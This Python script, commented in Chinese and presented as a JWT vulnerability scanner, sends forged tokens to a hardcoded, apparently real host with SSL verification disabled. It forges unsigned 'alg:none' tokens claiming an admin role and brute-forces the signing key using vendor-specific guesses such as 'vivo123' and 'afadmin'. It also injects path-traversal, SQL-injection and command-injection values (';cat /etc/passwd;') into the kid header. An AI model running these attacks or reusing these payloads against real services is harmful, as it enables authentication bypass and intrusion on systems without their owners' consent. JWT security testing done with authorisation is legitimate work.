#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT漏洞扫描工具
功能：自动检测JWT实现中的安全漏洞
作者：安全团队
版本：1.0
"""

import jwt
import requests
import base64
import json
from urllib.parse import quote
import warnings

# 禁用SSL警告（用于处理自签名证书）
warnings.filterwarnings('ignore')

class JWTTester:
    """
    JWT漏洞测试器类
    用于检测JWT实现中的各种安全漏洞
    """

    def __init__(self, target_url, jwt_token=None):
        """
        初始化测试器

        参数:
        target_url -- 目标URL（接收JWT的端点）
        jwt_token -- 可选的有效JWT令牌（用于测试）
        """
        self.target_url = target_url
        self.jwt_token = jwt_token
        self.results = []  # 存储测试结果

    def test_none_algorithm(self):
        """
        测试alg:none漏洞
        尝试发送使用'none'算法的JWT，绕过签名验证

        返回:
        none_token -- 生成的none算法令牌（如果成功）
        """
        print("[*] Testing alg:none attack...")
        try:
            if not self.jwt_token:
                print("[-] No JWT token provided, generating test token...")
                # 生成测试负载
                payload = {"user": "admin", "role": "administrator"}
                # 创建特殊header，设置算法为none
                header = {'alg': 'none', 'typ': 'JWT'}
            else:
                # 使用提供的令牌
                # 获取未验证的头部信息
                header = jwt.get_unverified_header(self.jwt_token)
                # 解码负载（不验证签名）
                payload = jwt.decode(self.jwt_token, options={"verify_signature": False})
                # 修改算法为none
                header['alg'] = 'none'

            # 手动构造JWT（无签名）
            # 编码头部
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip("=")

            # 编码负载
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip("=")

            # 组合成无签名的JWT（以 . 结尾）
            none_token = f"{encoded_header}.{encoded_payload}."

            # 发送请求
            test_url = f"{self.target_url}{none_token}"
            print(f"[+] Testing URL: {test_url[:100]}...")

            # 发送HTTP GET请求（忽略SSL验证）
            response = requests.get(
                test_url,
                verify=False,
                timeout=10,
                allow_redirects=True
            )

            print(f"[+] None algorithm token: {none_token[:80]}...")
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response length: {len(response.text)}")

            # 检查响应是否成功（200 OK）
            if response.status_code == 200:
                print("[!] POTENTIALLY VULNERABLE: alg:none accepted!")
                self.results.append(("alg:none", "VULNERABLE", none_token))
                return none_token

        except Exception as e:
            print(f"[-] Error in none algorithm test: {e}")

        return None

    def test_weak_secret(self):
        """
        测试弱密钥漏洞
        尝试使用常见弱密钥破解JWT签名

        返回:
        secret -- 找到的密钥（如果破解成功）
        """
        print("\n[*] Testing weak secrets...")

        if not self.jwt_token:
            print("[-] No JWT token provided for weak secret testing")
            return None

        # 常见的弱密钥列表（可扩展）
        common_secrets = [
            'secret', 'secret123', 'password', '123456',
            'admin', 'test', 'key', 'jwt', 'token',
            'vivo', 'vivo123', 'afadmin', 'afos',
            '', 'root', 'admin123', 'qwerty', 'letmein'
        ]

        # 尝试每个秘钥
        for secret in common_secrets:
            try:
                # 使用当前密钥尝试解码令牌
                decoded = jwt.decode(
                    self.jwt_token,
                    secret,
                    algorithms=['HS256', 'HS384', 'HS512']
                )
                print(f"[!] VULNERABLE: Secret found: {secret}")
                print(f"[+] Decoded payload: {decoded}")
                self.results.append(("weak_secret", secret, decoded))
                return secret
            except jwt.InvalidSignatureError:
                # 签名无效，继续尝试下一个
                continue
            except Exception as e:
                # 其他异常（如令牌格式错误）
                continue

        print("[-] No weak secret found in common list")
        return None

    def test_kid_injection(self):
        """
        测试kid参数注入漏洞
        尝试在kid头参数中注入恶意路径或SQL片段
        """
        print("\n[*] Testing kid parameter injection...")

        # 测试payload列表
        payloads = [
            "../../../../../../dev/null",  # 路径遍历
            "/dev/null",  # 空设备
            "key' UNION SELECT 'secret",  # SQL注入尝试
            "../../../etc/passwd",  # 读取系统文件
            ";cat /etc/passwd;",  # 命令注入尝试
            "non-existent-key"  # 无效密钥测试
        ]

        # 基本负载（可修改）
        base_payload = {"user": "admin", "role": "administrator"}

        for kid_payload in payloads:
            try:
                # 创建包含恶意kid的头部
                header = {
                    "alg": "HS256",
                    "typ": "JWT",
                    "kid": kid_payload
                }

                # 使用空字符串签名（对于/dev/null情况）
                token = jwt.encode(
                    base_payload,
                    "",  # 使用空密钥
                    algorithm="HS256",
                    headers=header
                )

                # 构造测试URL
                test_url = f"{self.target_url}{token}"
                print(f"[+] Testing kid: {kid_payload[:50]}")

                # 发送请求
                response = requests.get(test_url, verify=False, timeout=10)

                print(f"    Status: {response.status_code}")

                # 检查响应状态码
                if response.status_code == 200:
                    print(f"[!] POTENTIALLY VULNERABLE with kid: {kid_payload}")
                    self.results.append(("kid_injection", kid_payload, token))

            except Exception as e:
                print(f"[-] Error with payload {kid_payload}: {e}")

    def test_algorithm_confusion(self):
        """
        测试算法混淆漏洞（框架方法）
        在实际使用中需要服务器的公钥
        """
        print("\n[*] Testing algorithm confusion (RS256 -> HS256)...")
        print("[!] Note: This requires the public key from the server")
        print("[!] Check known endpoints for public key:")
        print("     - /.well-known/jwks.json")
        print("     - /jwks.json")
        print("     - /public.key")
        print("     - /api/public_key")

        # 此处可添加自动获取公钥的逻辑
        # 例如：
        # try:
        #    pubkey = requests.get(self.target_url + "/.well-known/jwks.json")
        #    # 然后尝试算法混淆攻击
        # except Exception as e:
        #    print(f"[-] Failed to get public key: {e}")

    def run_all_tests(self):
        """
        运行所有JWT漏洞测试
        并打印汇总结果
        """
        print("=" * 60)
        print("JWT Vulnerability Scanner")
        print(f"Target: {self.target_url}")
        print("=" * 60)

        # 测试1: None算法攻击
        self.test_none_algorithm()

        # 测试2: 弱密钥攻击（需要令牌）
        if self.jwt_token:
            self.test_weak_secret()

        # 测试3: kid注入攻击
        self.test_kid_injection()

        # 测试4: 算法混淆（框架方法）
        self.test_algorithm_confusion()

        # 打印结果汇总
        print("\n" + "=" * 60)
        print("SCAN RESULTS:")
        print("=" * 60)
        if self.results:
            for test_type, result, data in self.results:
                print(f"[!] {test_type}: {result}")
                print(f"    Data: {str(data)[:100]}...")
        else:
            print("[+] No obvious vulnerabilities found")
        print("=" * 60)

def main():
    """
    主函数
    配置并启动扫描
    """
    # 目标URL（需要扫描的JWT端点）
    target_url = "https://scsm-turfx.vivo.xyz/"

    # 可选：提供有效的JWT令牌用于某些测试
    # 格式: "header.payload.signature"
    # jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...."
    jwt_token = None

    # 创建测试器实例
    tester = JWTTester(target_url, jwt_token)

    # 运行所有测试
    tester.run_all_tests()

if __name__ == "__main__":
    # 程序入口
    main()